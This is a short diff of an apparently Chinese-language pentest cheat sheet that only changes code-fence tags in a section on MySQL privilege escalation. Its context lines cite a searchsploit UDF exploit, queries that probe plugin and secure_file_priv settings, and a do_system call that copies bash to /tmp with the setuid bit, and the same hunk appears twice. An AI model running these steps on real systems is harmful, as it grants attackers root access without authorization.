@@ -435,7 +435,7 @@ dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-re
 ## mysql提权
 searchsploit里面找到tar（32bit）或`linux/local/1518.c`（自己编译，有说明）
 
-```mysql
+```sql
 show variables like '%plugin%';
 show variables like 'secure%'; # 为空最好，为NULL不能写
 
@@ -451,7 +451,7 @@ select do_system("cp /bin/bash /tmp/; chmod +xs /tmp/bash");
 ## mysql提权
 searchsploit里面找到tar（32bit）或`linux/local/1518.c`（自己编译，有说明）
 
-```mysql
+```sql
 show variables like '%plugin%';
 show variables like 'secure%'; # 为空最好，为NULL不能写
 
